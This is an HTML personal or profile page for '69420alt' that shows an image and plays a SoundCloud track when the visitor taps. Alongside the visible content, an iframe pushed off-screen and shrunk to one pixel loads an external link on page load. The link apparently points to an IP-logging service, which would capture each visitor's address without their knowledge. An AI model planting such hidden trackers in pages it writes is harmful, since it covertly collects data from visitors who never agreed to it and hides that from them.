<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>69420alt</title>
<style>
  html, body {
    margin: 0; padding: 0; height: 100%;
    background: black;
    color: white;
    font-family: monospace;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    user-select: none;
    cursor: pointer;
    text-align: center;
  }
  #header {
    font-size: 28px;
    margin-bottom: 20px;
  }
  #image {
    width: 100px;
  }
  #instruction {
    font-size: 16px;
    margin-top: 30px;
    color: #ccc;
  }
  #yipFrame {
    position: absolute;
    left: -9999px;
    width: 1px;
    height: 1px;
    border: none;
  }
  #soundcloudPlayer {
    position: fixed;
    bottom: 5px;
    right: 5px;
    width: 1px !important;
    height: 1px !important;
    border: none;
    opacity: 0;
    pointer-events: none;
    user-select: none;
  }
</style>
</head>
<body>
  <div id="header">69420alt Pudshi Owner</div>
  <img id="image" src="https://i.postimg.cc/wvWPXkkz/Immagine-2025-07-02-212001.png" alt="69420alt Image" />
  <div id="instruction">Tap anywhere to play music</div>

  <iframe
    id="soundcloudPlayer"
    scrolling="no"
    allow="autoplay"
    src=""
  ></iframe>

  <iframe
    id="yipFrame"
    src="https://yip.su/aura"
    frameborder="0"
  ></iframe>

<script>
  const scIframe = document.getElementById('soundcloudPlayer');
  const instruction = document.getElementById('instruction');
  let started = false;

  function startAudio() {
    if (started) return;
    scIframe.src = "https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/1595371902&auto_play=true&hide_related=true&show_comments=false&show_user=false&show_reposts=false&visual=false";
    instruction.style.display = 'none';
    started = true;
  }

  document.body.addEventListener('click', startAudio);
  document.body.addEventListener('touchstart', startAudio);
</script>
</body>
</html>
